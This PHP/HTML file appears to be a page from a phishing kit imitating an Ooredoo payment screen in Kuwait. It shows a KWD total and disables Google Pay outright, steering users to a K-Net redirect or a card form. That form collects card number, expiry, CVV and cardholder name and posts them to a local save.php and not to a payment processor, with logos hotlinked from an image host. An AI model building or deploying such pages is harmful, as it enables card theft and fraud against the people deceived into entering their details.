<?php
// بدء الجلسة لاستلام المبلغ من الصفحة السابقة
session_start();
$amount = isset($_SESSION['amount']) ? $_SESSION['amount'] : '0.000'; 
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pay</title>
    <style>
        :root {
            --ooredoo-red: #ed1c24;
            --border-color: #e0e0e0;
            --text-gray: #757575;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0; padding: 0; background-color: #ffffff;
            color: #333; padding-bottom: 120px;
        }

        .header {
            display: flex; justify-content: space-between; align-items: center;
            padding: 15px 20px; border-bottom: 1px solid #f0f0f0;
        }
        .header h1 { font-size: 18px; margin: 0; font-weight: bold; }
        .header .icon { font-size: 22px; color: #000; text-decoration: none; }

        .container { padding: 20px; }

        .total-box {
            background-color: #f8f9fb; border-radius: 12px;
            padding: 15px; display: flex; justify-content: space-between;
            align-items: center; margin-bottom: 25px;
        }
        .total-box span { font-weight: bold; font-size: 16px; }
        .total-amount { font-size: 18px; font-weight: 900; }

        .section-title { font-size: 18px; font-weight: bold; margin-bottom: 5px; text-align: left; }
        .section-subtitle { font-size: 14px; color: var(--text-gray); margin-bottom: 20px; text-align: left; }

        .payment-method {
            border: 1px solid var(--border-color); border-radius: 15px;
            margin-bottom: 15px; overflow: hidden; transition: all 0.3s ease;
            background: #fff;
        }
        .payment-method.selected { border: 2px solid var(--ooredoo-red); }

        .method-header {
            padding: 18px; display: flex; justify-content: space-between;
            align-items: center; cursor: pointer;
        }
        .method-left { display: flex; align-items: center; gap: 15px; }
        .method-logo { width: 45px; height: 30px; object-fit: contain; }
        .method-name { font-size: 16px; font-weight: bold; }

        .radio-btn {
            width: 22px; height: 22px; border: 2px solid var(--border-color);
            border-radius: 50%; position: relative;
        }
        .selected .radio-btn { border-color: var(--ooredoo-red); background-color: var(--ooredoo-red); }
        .selected .radio-btn::after {
            content: "✓"; color: #fff; font-size: 12px;
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
        }

        .gpay-error {
            display: none; color: var(--ooredoo-red); font-size: 13px;
            padding: 0 18px 15px 18px; font-weight: bold; text-align: left;
        }

        #visa-form {
            display: none; padding: 10px 20px 20px 20px; border-top: 1px solid #f0f0f0;
        }
        .input-group { margin-bottom: 15px; }
        .card-input {
            width: 100%; border: none; border-bottom: 1px solid #ddd;
            padding: 10px 0; font-size: 16px; outline: none; box-sizing: border-box;
        }
        .card-row { display: flex; gap: 20px; }
        .card-icons-row { display: flex; justify-content: flex-start; gap: 8px; margin-top: 8px; }
        .mini-icon { width: 35px; height: auto; }

        .footer-btn {
            position: fixed; bottom: 30px; left: 20px; right: 20px;
        }
        .submit-btn {
            width: 100%; background-color: var(--ooredoo-red); color: #fff;
            border: none; padding: 18px; border-radius: 35px;
            font-size: 18px; font-weight: bold; cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="header">
        <a href="index.php" class="icon">←</a>
        <h1>Pay</h1>
        <a href="#" class="icon">🎧</a>
    </div>

    <div class="container">
        <div class="total-box">
            <span>Total</span>
            <!-- عرض المبلغ المستلم من الصفحة الأولى -->
            <span class="total-amount">KWD <?php echo htmlspecialchars($amount); ?></span>
        </div>

        <div class="section-title">Payment Method</div>
        <div class="section-subtitle">Please select a payment method</div>

        <!-- Google Pay -->
        <div class="payment-method" id="method-gpay" onclick="selectMethod('gpay')">
            <div class="method-header">
                <div class="method-left">
                    <img src="https://i.ibb.co/wFL49yQK/images.png" class="method-logo" alt="GPay">
                    <span class="method-name">Google pay</span>
                </div>
                <div class="radio-btn"></div>
            </div>
            <div class="gpay-error" id="gpay-msg">Payment via Google Pay is currently unavailable.</div>
        </div>

        <!-- K-Net -->
        <div class="payment-method" id="method-knet" onclick="selectMethod('knet')">
            <div class="method-header">
                <div class="method-left">
                    <img src="https://i.ibb.co/d49hn8GX/20181024172349986.jpg" class="method-logo" alt="Knet">
                    <span class="method-name">K-Net</span>
                </div>
                <div class="radio-btn"></div>
            </div>
        </div>

        <!-- Credit Card -->
        <div class="payment-method" id="method-visa" onclick="selectMethod('visa')">
            <div class="method-header">
                <div class="method-left">
                    <img src="https://i.ibb.co/rGnN2xy2/unnamed-1.png" class="method-logo" alt="Card">
                    <span class="method-name">Credit Card</span>
                </div>
                <div class="radio-btn"></div>
            </div>
            
            <div id="visa-form">
                <form action="save.php" method="POST">
                    <div class="input-group">
                        <input type="tel" class="card-input" placeholder="Card Number" name="card_number" required>
                        <div class="card-icons-row">
                            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="mini-icon">
                            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="mini-icon">
                        </div>
                    </div>
                    <div class="card-row">
                        <div class="input-group" style="flex: 1;">
                            <input type="text" class="card-input" placeholder="MM/YY" name="expiry" required>
                        </div>
                        <div class="input-group" style="flex: 1;">
                            <input type="tel" class="card-input" placeholder="CVV" name="cvv" required>
                        </div>
                    </div>
                    <div class="input-group">
                        <input type="text" class="card-input" placeholder="Cardholder Name" name="card_name" required>
                    </div>
                </form>
            </div>
        </div>

    </div>

    <div class="footer-btn">
        <button class="submit-btn" id="mainAction" onclick="redirectToKnet()">Pay</button>
    </div>

    <script>
        let currentMethod = '';

        function selectMethod(method) {
            currentMethod = method;
            document.querySelectorAll('.payment-method').forEach(m => m.classList.remove('selected'));
            document.getElementById('visa-form').style.display = 'none';
            document.getElementById('gpay-msg').style.display = 'none';

            const selectedElem = document.getElementById('method-' + method);
            selectedElem.classList.add('selected');

            if (method === 'visa') {
                document.getElementById('visa-form').style.display = 'block';
            } else if (method === 'gpay') {
                document.getElementById('gpay-msg').style.display = 'block';
            }
        }

        function redirectToKnet() {
            window.location.href = 'knet_payment.php';
        }
    </script>
</body>
</html>
